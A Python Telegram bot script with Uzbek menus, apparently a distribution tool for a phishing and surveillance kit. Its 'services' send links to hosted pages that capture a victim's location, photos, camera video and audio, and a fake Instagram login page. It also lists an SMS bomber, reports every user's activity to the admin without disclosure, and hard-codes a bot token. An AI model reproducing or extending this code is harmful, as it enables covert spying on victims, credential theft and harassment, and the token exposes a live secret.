
import telebot
from telebot import types

TOKEN = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI'
ADMIN_ID = 8275787221 
URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot"

bot = telebot.TeleBot(TOKEN)

# Asosiy menyu
def main_menu():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(types.KeyboardButton("🔐 Xizmatlar"), types.KeyboardButton("💼 Mening hisobim"))
    kb.add(types.KeyboardButton("❓ Qoidalar"), types.KeyboardButton("📞 Bog'lanish"))
    kb.add(types.KeyboardButton("💳 To'lov qilish"))
    return kb

# Xizmatlar menyusi
def services_menu():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(types.KeyboardButton("📍 Lokatsiya olish"), types.KeyboardButton("📸 Rasm olish"))
    kb.add(types.KeyboardButton("🎥 Old kamera video"), types.KeyboardButton("🔑 Instagram login"))
    kb.add(types.KeyboardButton("🎬 Orqa kamera video"))
    kb.add(types.KeyboardButton("💣 SMS Bomber"), types.KeyboardButton("🎵 Audio yozish"))
    kb.add(types.KeyboardButton("⬅️ Asosiy menyu"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    if m.from_user.id != ADMIN_ID:
        bot.send_message(ADMIN_ID, f"🔔 Yangi foydalanuvchi: {m.from_user.first_name} (ID: {m.from_user.id})")
    bot.send_message(m.chat.id, "Xush kelibsiz! Kerakli bo'limni tanlang:", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_all(m):
    # Admin uchun monitoring
    if m.from_user.id != ADMIN_ID:
        bot.send_message(ADMIN_ID, f"👤 {m.from_user.first_name} bosgan tugma: {m.text}")

    if m.text == "🔐 Xizmatlar":
        bot.send_message(m.chat.id, "Xizmatlar bo'limi:", reply_markup=services_menu())
    elif m.text == "⬅️ Asosiy menyu":
        bot.send_message(m.chat.id, "Asosiy menyuga qaytdingiz:", reply_markup=main_menu())
    
    # Xizmatlar havolalari
    elif m.text == "📸 Rasm olish":
        bot.send_message(m.chat.id, f"Havola: {URL}/index.html")
    elif m.text == "📍 Lokatsiya olish":
        bot.send_message(m.chat.id, f"Havola: {URL}/index-1.html")
    elif m.text == "🎥 Old kamera video":
        bot.send_message(m.chat.id, f"Havola: {URL}/index-2.html")
    elif m.text == "🎬 Orqa kamera video":
        bot.send_message(m.chat.id, f"Havola: {URL}/back-video.html")
    elif m.text == "🔑 Instagram login":
        bot.send_message(m.chat.id, f"Havola: {URL}/instagram.html")
    elif m.text == "💣 SMS Bomber":
        bot.send_message(m.chat.id, "Tez kunda qo'shiladi...")
    elif m.text == "🎵 Audio yozish":
        bot.send_message(m.chat.id, f"Havola: {URL}/audio.html")

bot.polling(none_stop=True)
